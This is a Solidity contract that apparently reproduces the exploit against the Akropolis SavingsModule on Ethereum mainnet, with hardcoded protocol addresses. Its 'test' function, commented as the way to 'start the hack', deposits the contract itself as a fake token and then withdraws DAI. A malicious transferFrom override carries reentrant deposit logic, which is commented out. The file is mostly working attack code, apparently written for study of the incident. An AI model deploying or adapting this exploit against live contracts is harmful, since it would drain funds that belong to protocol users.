//SPDX-License-Identifier: Unlicense
pragma solidity ^0.7.0;

import "hardhat/console.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "./ISavingsModule.sol";
import "./IUniswapV2Pair.sol";

// @Dan | ChainShot#6490 a thought: exploiter wrote a function on their ERC20 contract to call the akro contract from that contract, because in that manner the whole process ended on their contract and they could then set approve to `0` and not be worried about being "hacked" back, maybe? 

// Had they done it 

contract Fiddy {

    // AKRO contract
    ISavingsModule savingsModule = ISavingsModule(0x73fC3038B4cD8FfD07482b92a52Ea806505e5748);
    // DAI/WETH pair for flashloan
    IUniswapV2Pair pair = IUniswapV2Pair(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11);
    // one of the supported protocols:
    address curveYPool = 0x7967adA2A32A633d5C055e2e075A83023B632B4e;
    // pool token for ^^
    address delphiYPool = 0x2AFA3c8Bf33E65d5036cD0f1c3599716894B3077; 

    ERC20 dai = ERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F); 
    ERC20 delphiYPoolToken = ERC20(delphiYPool);
    uint entered;
    uint daiBalance;

    constructor() payable {


    }
    
    // call this to start the hack
    function test() external {
        daiBalance = dai.balanceOf(address(this));
        console.log('daiBalance Start: ', daiBalance);

        helper();

        daiBalance = dai.balanceOf(address(this));
        console.log('daiBalance End: ', daiBalance/10**18);

    }

    function helper() internal {
        // now send the tokens to the savingsmodule:
        uint[] memory amountsIn = new uint[](1);
        amountsIn[0] = 5000000*10**18;
        address[] memory tokensIn = new address[](1);
        tokensIn[0] = address(this);
        console.log("Depositing fake tokens");
        uint nDeposit = savingsModule.deposit(curveYPool, tokensIn, amountsIn);
        uint delphiYPoolTokenBal = delphiYPoolToken.balanceOf(address(this));
        console.log('- delphiYPoolTokenBal: ', delphiYPoolTokenBal);
        console.log('- nDeposit: ', nDeposit);

        uint amountOut = 10*10**18;
        savingsModule.withdraw(curveYPool, address(dai), amountOut, 0);
    }


    // transferFrom, a.k.a. "Eye am the Captain now".
    // this will be the malicious implementation *one million dollars*
    function transferFrom(address sender, address recipient, uint256 amount) public virtual returns (bool) {
        console.log("- Into transferFrom");    



        // address[] memory tokensIn = new address[](1);
        // tokensIn[0] = address(dai);
        // uint[] memory amountsIn = new uint[](1);
        // amountsIn[0] = borrow;

        // console.log('START SECOND DEPOSIT');

        // savingsModule.deposit(curveYPool, tokensIn, amountsIn);
        // console.log('- Dai balance: ', dai.balanceOf(address(this)));

        // uint delphiYPoolTokenBal = delphiYPoolToken.balanceOf(address(this));
        // console.log('- delphiYPoolTokenBal: ', delphiYPoolTokenBal);



        return true;

    }






  receive() external payable {}

}
